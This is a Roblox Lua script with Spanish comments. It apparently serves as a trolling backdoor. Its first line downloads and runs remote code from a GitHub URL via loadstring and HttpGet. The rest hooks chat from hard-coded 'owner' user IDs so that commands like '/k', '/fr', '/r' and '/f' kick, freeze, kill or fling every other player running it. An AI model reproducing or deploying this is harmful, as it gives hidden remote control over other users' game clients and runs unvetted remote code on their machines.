loadstring(game:HttpGet("https://raw.githubusercontent.com/Troll-Hub/LonelySC/refs/heads/main/ssc"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Lighting = game:GetService("Lighting")

-- IDs de los dueños (agrega todos los que quieras aquí, papi 👑)
local OWNER_IDS = {
    2061467416,   -- tú, papi principal
    123456789,    -- amigo o segundo amo
    -- 987654321, -- descomenta y agrega más si quieres
    -- 111222333, -- otro más, etc.
}

-- Función que se activa cuando UN OWNER escribe un comando
local function onOwnerCommand(message)
    local msg = message:lower()
    
    -- Si el jugador ES uno de los Owners → CANCELAR TODO, nada se ejecuta
    if table.find(OWNER_IDS, LocalPlayer.UserId) then
        print("Cancelado para OWNER: " .. msg .. " (eres uno de los amos, papi 😏)")
        return
    end
    
    -- Solo plebeyos (no en la lista) sufren el efecto 😈
    print("Plebeyo " .. LocalPlayer.Name .. " sufriendo: " .. msg .. " 💦")
    
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") or not character:FindFirstChild("Humanoid") then
        return
    end
    
    local humanoid = character.Humanoid
    local rootPart = character.HumanoidRootPart
    
    if msg == "/k" then
        game:Shutdown()
        print("¡Plebeyo kickeado! 💥")
        
    elseif msg == "/fr" then
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = true
            end
        end
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        print("¡Congelado! ❄️")
        
    elseif msg == "/unfr" then
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = false
            end
        end
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        print("¡Descongelado! 🔥")
        
    elseif msg == "/r" then
        humanoid.Health = 0
        print("¡Reseteado! 💀")
        
    elseif msg == "/f" then
        rootPart.Velocity = Vector3.new(math.random(-200, 200), 150, math.random(-200, 200))
        print("¡Flingeado! 🚀")
        
    elseif msg == "/j" then
        humanoid.JumpPower = 120
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        task.wait(0.2)
        humanoid.JumpPower = 50
        print("¡Salto forzado! 🦘")
        
    elseif msg == "/l" then
        local originalFogEnd = Lighting.FogEnd
        local originalFogColor = Lighting.FogColor
        
        Lighting.FogEnd = 10
        Lighting.FogColor = Color3.new(0, 0, 0)
        
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Head") then
                local billboard = plr.Character.Head:FindFirstChildOfClass("BillboardGui")
                if billboard then billboard.Enabled = false end
            end
        end
        
        print("¡Modo oscuridad activado! 🌑")
        
        task.wait(10)
        
        Lighting.FogEnd = originalFogEnd
        Lighting.FogColor = originalFogColor
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Head") then
                local billboard = plr.Character.Head:FindFirstChildOfClass("BillboardGui")
                if billboard then billboard.Enabled = true end
            end
        end
        print("¡Modo oscuridad desactivado! ☀️")
    end
end

-- Hookear el chat SOLO de los Owners en todos los clientes
local function hookOwnerChat(player)
    if table.find(OWNER_IDS, player.UserId) then
        player.Chatted:Connect(onOwnerCommand)
    end
end

-- Jugadores actuales
for _, player in ipairs(Players:GetPlayers()) do
    hookOwnerChat(player)
end

-- Nuevos jugadores
Players.PlayerAdded:Connect(hookOwnerChat)
